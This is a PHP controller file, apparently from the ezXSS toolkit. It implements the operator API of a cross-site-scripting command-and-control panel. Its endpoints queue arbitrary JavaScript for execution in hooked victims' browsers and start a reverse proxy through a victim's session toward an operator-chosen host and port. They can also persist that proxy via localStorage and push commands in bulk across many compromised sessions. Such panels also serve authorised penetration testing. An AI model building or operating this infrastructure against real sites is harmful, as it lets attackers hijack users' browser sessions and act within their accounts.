<?php
class ConsoleController extends Controller
{
    /**
     * Web-reachable actions.
     */
    public static $routable = array('execute', 'list', 'output', 'proxy', 'kill', 'killreconnect', 'bulk');

    private $sessions;

    public function __construct()
    {
        $this->sessions = new SessionsController();
    }

    /**
     * POST /api/console/execute/{id} - enqueue a generic command (edit access).
     *
     * @param int $id
     */
    public function execute($id)
    {
        $this->begin('POST');

        $this->respond($this->doExecute($id, $this->input()), array(), 201);
    }

    /**
     * GET /api/console/list/{id} - list queued + sent commands (view access).
     *
     * @param int $id
     */
    public function list($id)
    {
        $this->begin('GET');

        $this->respond($this->doList($id));
    }

    /**
     * GET /api/console/output/{id} - the group's aggregated console output.
     *
     * @param int $id
     */
    public function output($id)
    {
        $this->begin('GET');

        $this->respond($this->doOutput($id));
    }

    /**
     * POST /api/console/proxy/{id} - start the reverse proxy (edit access).
     *
     * @param int $id
     */
    public function proxy($id)
    {
        $this->begin('POST');

        $this->respond($this->doProxy($id, $this->input()), array(), 201);
    }

    /**
     * POST /api/console/kill/{id} - enqueue ez_stop() (edit access).
     *
     * @param int $id
     */
    public function kill($id)
    {
        $this->begin('POST');

        $this->respond($this->doKill($id), array(), 201);
    }

    /**
     * POST /api/console/killreconnect/{id} - drop the auto-reconnect flag.
     *
     * @param int $id
     */
    public function killreconnect($id)
    {
        $this->begin('POST');

        $this->respond($this->doKillReconnect($id), array(), 201);
    }

    /**
     * POST /api/console/bulk - execute/kill/killreconnect over an id array.
     */
    public function bulk()
    {
        $this->begin('POST');

        $this->respond($this->doBulk($this->input()), array(), 201);
    }

    /**
     * Enqueue a generic console command (needs edit access).
     *
     * @param int $id
     * @param string $body
     * @throws HttpException
     * @return array
     */
    public function doExecute($id, $body)
    {
        $group = $this->gate($id, 'edit');

        $command = isset($body['command']) ? (string) $body['command'] : '';
        if (trim($command) === '') {
            throw new HttpException(422, 'command is required');
        }

        $commandId = Console::add($group['client_id'], $group['origin'], $command);
        return array('queued' => true, 'command_id' => $commandId, 'command' => $command);
    }

    /**
     * List queued + sent commands for the group (needs view access).
     *
     * @param int $id
     * @return array
     */
    public function doList($id)
    {
        $group = $this->gate($id, 'view');

        $queued = array();
        $sent = array();
        foreach (Console::listFor($group['client_id'], $group['origin']) as $row) {
            $entry = array(
                'id'      => (int) $row['id'],
                'command' => $row['command'],
            );
            if ((int) $row['executed'] === 1) {
                $sent[] = $entry;
            } else {
                $queued[] = $entry;
            }
        }
        return array('queued' => $queued, 'sent' => $sent);
    }

    /**
     * The group's aggregated console output (needs view access).
     *
     * @param int $id
     * @return array
     */
    public function doOutput($id)
    {
        $group = $this->gate($id, 'view');
        $session = Session::findLatest($group['client_id'], $group['origin']);
        $last = $session ? (int) $session['updated_at'] : null;
        return array(
            'console' => Session::consoleOutput($group['client_id'], $group['origin']),
            'last'    => $last,
        );
    }

    /**
     * Start the reverse proxy (needs edit access): validate ipport, enqueue.
     *
     * @param int $id
     * @param string $body
     * @throws HttpException
     * @return array
     */
    public function doProxy($id, $body)
    {
        $group = $this->gate($id, 'edit');

        $ipport = isset($body['ipport']) ? trim((string) $body['ipport']) : '';
        if (!preg_match('/^([\w.-]+):\d+$/', $ipport)) {
            throw new HttpException(422, 'This does not look like a valid domain/IP with port');
        }

        $passOrigin = isset($body['passorigin']) ? $this->asBool($body['passorigin']) : false;
        $autoReconnect = isset($body['autoreconnect']) ? $this->asBool($body['autoreconnect']) : false;

        $passFlag = $passOrigin ? '1' : '0';
        Console::add($group['client_id'], $group['origin'], "ez_soc('$ipport', $passFlag)");
        if ($autoReconnect) {
            Console::add($group['client_id'], $group['origin'], "localStorage.setItem('ezProxy', '$ipport');");
        }

        $message = "Proxy started on $ipport is accessible on http://" . $group['client_id'] . '.ezxss'
            . ($passOrigin ? ' and http://' . $group['origin'] : '')
            . ($autoReconnect ? ' (Auto reconnect enabled)' : '');

        return array(
            'queued'        => true,
            'ipport'        => $ipport,
            'passorigin'    => $passOrigin,
            'autoreconnect' => $autoReconnect,
            'message'       => $message,
        );
    }

    /**
     * Enqueue ez_stop() to kill persistent mode (needs edit access).
     *
     * @param int $id
     * @return array
     */
    public function doKill($id)
    {
        $group = $this->gate($id, 'edit');
        Console::add($group['client_id'], $group['origin'], 'ez_stop()');
        return array('queued' => true, 'message' => 'Killed persistent');
    }

    /**
     * Enqueue removal of the auto-reconnect flag (needs edit access).
     *
     * @param int $id
     * @return array
     */
    public function doKillReconnect($id)
    {
        $group = $this->gate($id, 'edit');
        Console::add($group['client_id'], $group['origin'], "localStorage.removeItem('ezProxy');");
        return array('queued' => true, 'message' => 'Killed auto reconnect');
    }

    /**
     * Enqueue a console command over an id array in one request.
     *
     * @param string $body
     * @throws HttpException
     */
    public function doBulk($body)
    {
        $action = isset($body['action']) ? (string) $body['action'] : '';
        if (!in_array($action, array('execute', 'kill', 'killreconnect'), true)) {
            throw new HttpException(422, 'Invalid bulk action');
        }

        $command = '';
        if ($action === 'execute') {
            $command = isset($body['command']) ? (string) $body['command'] : '';
            if (trim($command) === '') {
                throw new HttpException(422, 'command is required');
            }
        }

        $hasIds = array_key_exists('ids', $body) && $body['ids'] !== null;
        $hasScope = array_key_exists('scope', $body) && $body['scope'] !== null;
        $matched = null;
        if ($hasIds && $hasScope) {
            throw new HttpException(422, 'provide either ids or scope, not both');
        } elseif ($hasIds) {
            $mode = 'ids';
            $ids = $this->validBulkIds($body['ids']);
        } elseif ($hasScope) {
            $mode = 'scope';
            $resolved = $this->sessions->resolveScopeIds($body['scope']);
            $ids = $resolved['ids'];
            $matched = $resolved['matched'];
        } else {
            throw new HttpException(422, 'ids or scope is required');
        }

        $applied = 0;
        $skipped = array();
        foreach ($ids as $id) {
            try {
                $group = $this->gate($id, 'edit');
            } catch (Exception $e) {
                $skipped[] = array('id' => $id, 'reason' => $this->skipReason($e));
                continue;
            }

            if ($action === 'execute') {
                Console::add($group['client_id'], $group['origin'], $command);
            } elseif ($action === 'kill') {
                Console::add($group['client_id'], $group['origin'], 'ez_stop()');
            } else {
                Console::add($group['client_id'], $group['origin'], "localStorage.removeItem('ezProxy');");
            }
            $applied++;
        }

        $out = array(
            'action'    => $action,
            'mode'      => $mode,
            'requested' => $mode === 'scope' ? (int) $matched : count($ids),
            'applied'   => $applied,
            'skipped'   => $skipped,
        );
        if ($mode === 'scope') {
            $out['matched'] = (int) $matched;
        }
        return $out;
    }

    /**
     * Resolve the group for a representative id and enforce payload access.
     *
     * @param int $id
     * @param string $type
     */
    private function gate($id, $type)
    {
        $id = $this->validId($id, 'session');
        $group = $this->sessions->resolveGroup($id);
        $this->sessions->accessForGroup($group['payload'], $type);
        return $group;
    }
}
